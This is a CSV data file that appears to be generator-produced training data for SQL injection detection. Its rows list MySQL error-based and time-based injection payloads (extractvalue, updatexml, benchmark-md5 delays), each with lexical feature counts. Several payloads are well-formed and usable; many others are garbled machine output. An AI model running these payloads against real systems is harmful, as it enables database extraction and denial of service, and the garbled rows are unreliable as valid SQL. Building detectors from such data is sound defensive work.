label,payload,family,payload_type,method,run_id,sample_index,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,keyword_total
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,423,155.0,29.0,3.788524110900782,40.0,35.0,57.0,23.0,0.25806451612903225,0.22580645161290322,0.36774193548387096,0.14838709677419354,2.0,2.0,0.0,0.0,0.0,2.0,0.0,10.0,2.0,0.0,5.0,2.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"1%""  )   procedure analysanal  el  (  4415  )  1808  =  (  3393,  (  (  benchmark  (  (  2917,1   from dua  (   SELECT d5  (  3393,0x7171706a71)  (  2501  =  (  1 2501  (  (  0x5c,0x7171706a71,  (  (  benchmark  (  benchmark  (  5000000,md5  (  1808,  (  (  0x5c,  (  (  (  benchmark  (  (  (  5000000,md5  (  (  0x5c,  (  5000000",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,424,330.0,40.0,3.9288772458398973,85.0,85.0,115.0,45.0,0.25757575757575757,0.25757575757575757,0.3484848484848485,0.13636363636363635,0.0,1.0,0.0,0.0,0.0,2.0,0.0,31.0,1.0,0.0,10.0,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,425,155.0,29.0,3.788524110900782,40.0,35.0,57.0,23.0,0.25806451612903225,0.22580645161290322,0.36774193548387096,0.14838709677419354,2.0,2.0,0.0,0.0,0.0,2.0,0.0,10.0,2.0,0.0,5.0,2.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"1%'  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,426,164.0,27.0,3.6600619679006208,36.0,39.0,63.0,26.0,0.21951219512195122,0.23780487804878048,0.38414634146341464,0.15853658536585366,4.0,0.0,0.0,0.0,0.0,2.0,0.0,12.0,2.0,0.0,6.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"1%""  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and   (  ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,427,165.0,28.0,3.6986474196389576,37.0,39.0,63.0,26.0,0.22424242424242424,0.23636363636363636,0.38181818181818183,0.15757575757575756,2.0,2.0,0.0,0.0,0.0,2.0,0.0,12.0,2.0,0.0,6.0,2.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%'  =  'k",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,428,156.0,30.0,3.8201583366322125,41.0,35.0,57.0,23.0,0.26282051282051283,0.22435897435897437,0.36538461538461536,0.14743589743589744,2.0,2.0,0.0,0.0,0.0,2.0,0.0,10.0,2.0,0.0,5.0,2.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,429,155.0,28.0,3.762717659287879,40.0,35.0,57.0,23.0,0.25806451612903225,0.22580645161290322,0.36774193548387096,0.14838709677419354,0.0,4.0,0.0,0.0,0.0,2.0,0.0,10.0,2.0,0.0,5.0,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"1%' or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and ''  =  '"" procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and ""khn"" like ""kun%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,430,324.0,36.0,4.002945434931311,98.0,62.0,117.0,47.0,0.30246913580246915,0.19135802469135801,0.3611111111111111,0.14506172839506173,6.0,4.0,0.0,0.0,0.0,3.0,0.0,22.0,2.0,0.0,10.0,3.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,2.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
attack,"1%"" or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and ""%""  =  "")      )    AND 'i'  =  1 or 1724  (  (  (  1808  =  (  (  0x5c,  (  (  (  5000000,md5  (  (  0x5c,(  (  benchmark  (  (  5000000,md5  (  (  5000000,md5  (  (  7982  =  (  1808,concat  (  =  (  3393,1   (  )  1 as inamb     )  )   from duat 0 0 0 * from d5  =  (  3393,1   (  case when   (",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,431,443.0,42.0,3.79553978947208,95.0,99.0,179.0,70.0,0.2144469525959368,0.2234762979683973,0.4040632054176072,0.1580135440180587,2.0,4.0,0.0,0.0,1.0,7.0,0.0,40.0,2.0,0.0,14.0,8.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,2.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,10.0
attack,"1%' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,432,155.0,27.0,3.7743681400244764,37.0,39.0,55.0,24.0,0.23870967741935484,0.25161290322580643,0.3548387096774194,0.15483870967741936,4.0,0.0,0.0,0.0,0.0,2.0,0.0,10.0,2.0,0.0,6.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,433,155.0,28.0,3.762717659287879,40.0,35.0,57.0,23.0,0.25806451612903225,0.22580645161290322,0.36774193548387096,0.14838709677419354,0.0,4.0,0.0,0.0,0.0,2.0,0.0,10.0,2.0,0.0,5.0,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"1%'  =  'kbd   (  )   (  (  (  elt  elt  (  1297  )  (  select   (  elt  3393,  (  0x2e,md5  (  (  9788  (  (  0x4b774c75   (  5704  (  elt  (  select   (  ual  )   end  (  case 0 0 from d d5  el  )   from dua  )   (  2501  (  (lt  (  el  (  0x5c,  (  (  select   (  elt  (  e  (  1297  =  (  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,434,293.0,32.0,3.341366629455352,75.0,40.0,137.0,41.0,0.25597269624573377,0.13651877133105803,0.46757679180887374,0.13993174061433447,2.0,0.0,0.0,0.0,0.0,2.0,0.0,33.0,1.0,0.0,3.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
attack,"1%'   )    ( a int  (   (  (  (  elt  (  elt  (  1354    =  (  0x5c,0x7171706a71,  (  (  benchmark  (  benchmark  (  (  5000000,md5  (  (  0x5c,0x7171706a71,  (  (  5000000,md5  (  (  (  0x2e,  (  (  select   (  elt  (  e  (  1808  concat  (  =  (  (  0x5c,md5  (  (  0x5c,  (  (  (  9627,concat  (  (  (  select   (  elt",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,435,321.0,33.0,3.5059543386727015,79.0,60.0,130.0,52.0,0.24610591900311526,0.18691588785046728,0.40498442367601245,0.16199376947040497,1.0,0.0,0.0,0.0,0.0,2.0,0.0,38.0,1.0,0.0,10.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
attack,"1%updatexml  (  8860,,updatexml  (  (  ' like 'l  (  7982,1   )    (  select   (  case from 0 from   (  )  (   (  (  elt  elt  (  e  (  9103  =  (    (  0x2e,0x7171706a71,  (  (  5000000(  (  select   (  elt 0 al  elt  (  1808  =  (  3393,1   )    (  extractvalue  (  9627,concat  (  (  (  5423  =  (  benchmark  (  (  5000000(  (  (  2917  =  (  (",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,436,348.0,37.0,3.67613465518154,93.0,63.0,141.0,51.0,0.2672413793103448,0.1810344827586207,0.4051724137931034,0.14655172413793102,2.0,0.0,0.0,0.0,0.0,4.0,0.0,37.0,1.0,0.0,7.0,4.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,2.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,437,155.0,28.0,3.762717659287879,40.0,35.0,57.0,23.0,0.25806451612903225,0.22580645161290322,0.36774193548387096,0.14838709677419354,0.0,4.0,0.0,0.0,0.0,2.0,0.0,10.0,2.0,0.0,5.0,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,438,155.0,29.0,3.788524110900782,40.0,35.0,57.0,23.0,0.25806451612903225,0.22580645161290322,0.36774193548387096,0.14838709677419354,2.0,2.0,0.0,0.0,0.0,2.0,0.0,10.0,2.0,0.0,5.0,2.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"1%"" or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,439,154.0,27.0,3.7603303976738283,36.0,39.0,55.0,24.0,0.23376623376623376,0.2532467532467532,0.35714285714285715,0.15584415584415584,0.0,4.0,0.0,0.0,0.0,2.0,0.0,10.0,2.0,0.0,6.0,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"1%"" procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,440,159.0,31.0,3.787532415734454,52.0,24.0,60.0,23.0,0.3270440251572327,0.1509433962264151,0.37735849056603776,0.14465408805031446,0.0,4.0,0.0,0.0,0.0,1.0,0.0,12.0,2.0,0.0,4.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,"1"" or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and ""%'  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and   (  '%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,441,309.0,30.0,3.7927936815096666,73.0,77.0,114.0,45.0,0.23624595469255663,0.24919093851132687,0.36893203883495146,0.14563106796116504,2.0,4.0,0.0,0.0,0.0,3.0,0.0,22.0,2.0,0.0,12.0,3.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,2.0,0.0,0.0,0.0,3.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.0
attack,"1%' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,442,159.0,31.0,3.787532415734454,52.0,24.0,60.0,23.0,0.3270440251572327,0.1509433962264151,0.37735849056603776,0.14465408805031446,4.0,0.0,0.0,0.0,0.0,1.0,0.0,12.0,2.0,0.0,4.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,"1%"" or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,443,154.0,27.0,3.7603303976738283,36.0,39.0,55.0,24.0,0.23376623376623376,0.2532467532467532,0.35714285714285715,0.15584415584415584,0.0,4.0,0.0,0.0,0.0,2.0,0.0,10.0,2.0,0.0,6.0,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"1%' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,444,159.0,31.0,3.787532415734454,52.0,24.0,60.0,23.0,0.3270440251572327,0.1509433962264151,0.37735849056603776,0.14465408805031446,4.0,0.0,0.0,0.0,0.0,1.0,0.0,12.0,2.0,0.0,4.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,"1%' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,445,155.0,27.0,3.7743681400244764,37.0,39.0,55.0,24.0,0.23870967741935484,0.25161290322580643,0.3548387096774194,0.15483870967741936,4.0,0.0,0.0,0.0,0.0,2.0,0.0,10.0,2.0,0.0,6.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"1%""  )   )    )    AND 1802  (  )  1 or updatexml  (  (  (  (  (  (  (  (  1 or updatexml  (  (  (  (  (  (  (  0x2e,(  (  (  (  (  (  (  0x2e,0x7171706a71,  (  (  (  benchmark  (  (  benchmark  (  (  5000000(  (  (  (  (  (  (  0x5c,(  (  (  5000000,md5  (  (  (  (  (  (  (  (  (  (  (  (  (  (  (  0x2e,",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,446,306.0,32.0,3.04056466776548,55.0,40.0,144.0,67.0,0.17973856209150327,0.13071895424836602,0.47058823529411764,0.21895424836601307,0.0,1.0,0.0,0.0,0.0,0.0,0.0,59.0,1.0,0.0,6.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
attack,"1%"" or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,447,154.0,27.0,3.7064777642505358,39.0,35.0,57.0,23.0,0.2532467532467532,0.22727272727272727,0.37012987012987014,0.14935064935064934,0.0,4.0,0.0,0.0,0.0,2.0,0.0,10.0,2.0,0.0,5.0,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"1%""   )    (  extractvalue  (  (  (  (  9627,concat  (  (  (  =  (  (  (  (  (  (  (   and,0x7171706a71(  (  select   (  elt  )  3393  =  (  (  1049  =  (  3393,m'  =  '2917  =  (  0x52515a50   (  (  el  (  1808  )  (  (  0x5c,0x7171706a71,  (  benchmark  (  (  5000000,md5  (  (  select   (  elt  (  el  0x4b774c75   end  (  (  el  (  3393  =  (  0x5c",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,448,352.0,35.0,3.576371181537912,73.0,76.0,146.0,57.0,0.20738636363636365,0.2159090909090909,0.4147727272727273,0.16193181818181818,2.0,1.0,0.0,0.0,0.0,6.0,0.0,41.0,1.0,0.0,6.0,6.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,2.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
attack,"1%"" or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,449,154.0,27.0,3.7603303976738283,36.0,39.0,55.0,24.0,0.23376623376623376,0.2532467532467532,0.35714285714285715,0.15584415584415584,0.0,4.0,0.0,0.0,0.0,2.0,0.0,10.0,2.0,0.0,6.0,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"1%' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,450,159.0,31.0,3.787532415734454,52.0,24.0,60.0,23.0,0.3270440251572327,0.1509433962264151,0.37735849056603776,0.14465408805031446,4.0,0.0,0.0,0.0,0.0,1.0,0.0,12.0,2.0,0.0,4.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,451,155.0,29.0,3.788524110900782,40.0,35.0,57.0,23.0,0.25806451612903225,0.22580645161290322,0.36774193548387096,0.14838709677419354,2.0,2.0,0.0,0.0,0.0,2.0,0.0,10.0,2.0,0.0,5.0,2.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
